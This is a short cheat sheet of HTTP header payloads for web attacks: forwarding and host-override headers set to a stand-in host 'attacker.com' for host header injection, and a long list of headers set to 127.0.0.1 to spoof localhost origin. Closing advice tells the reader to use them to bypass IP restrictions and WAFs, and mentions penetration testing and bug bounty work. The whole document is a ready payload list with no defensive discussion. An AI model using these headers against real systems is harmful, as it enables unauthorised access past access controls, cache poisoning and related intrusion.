
---

### **HTTP Header Manipulation for Bypassing Security**

#### **1. Common Headers for Bypassing Security**
- X-Forwarded-For: attacker.com
- X-Forwarded-Host: attacker.com
- X-Forwarded-Proto: attacker.com
- Host: attacker.com (duplicate this header)
- X-Host: attacker.com
- X-Forwarded-Server: attacker.com
- X-HTTP-Host-Override: attacker.com
- Forwarded: attacker.com

#### **2. Localhost Bypass Headers**
- Base-Url: 127.0.0.1
- Client-IP: 127.0.0.1
- Forwarded-For: 127.0.0.1
- Forwarded-For-Ip: 127.0.0.1
- Http-Url: 127.0.0.1
- nullOrigin: 127.0.0.1
- Origin: 127.0.0.1
- Proxy-Host: 127.0.0.1
- Proxy-Url: 127.0.0.1
- Real-Ip: 127.0.0.1
- Redirect: 127.0.0.1
- Referer: 127.0.0.1
- Referrer: 127.0.0.1
- Refferer: 127.0.0.1
- Request-Uri: 127.0.0.1
- Uri: 127.0.0.1
- Url: 127.0.0.1
- X-Client-IP: 127.0.0.1
- X-Custom-IP-Authorization: 127.0.0.1
- X-Custom-IP-Authorization:127.0.0.1
- X-Forwarded: 127.0.0.1
- X-Forwarded-By: 127.0.0.1
- X-Forwarded-For: 127.0.0.1
- X-Forwarded-For-Original: 127.0.0.1
- X-Forwarded-Host: 127.0.0.1
- X-Forwarded-Port: 127.0.0.1
- X-Forwarded-Scheme: 127.0.0.1
- X-Forwarded-Server: 127.0.0.1
- X-Forwarder-For: 127.0.0.1
- X-Forward-For: 127.0.0.1
- X-Frame-Options: Allow
- X-Host: 127.0.0.1
- X-Http-Destinationurl: 127.0.0.1
- X-Http-Host-Override: 127.0.0.1
- X-Original-Remote-Addr: 127.0.0.1
- X-Original-Url: 127.0.0.1
- X-Originating-IP: 127.0.0.1
- X-Proxy-Url: 127.0.0.1
- X-Real-Ip: 127.0.0.1
- X-Remote-Addr: 127.0.0.1
- X-Remote-IP: 127.0.0.1
- X-Rewrite-Url: 127.0.0.1

---

### **How to Use This Information**
1. **Bypass Security Mechanisms**:
   - Use these headers to bypass IP restrictions, WAFs, or other security mechanisms.

2. **Testing**:
   - Test these headers in your penetration testing or bug bounty engagements to identify vulnerabilities.

3. **Localhost Bypass**:
   - Use headers like `X-Forwarded-For: 127.0.0.1` to simulate requests coming from localhost.

4. **Duplicate Headers**:
   - Duplicate headers like `Host` to confuse the server or bypass checks.

---

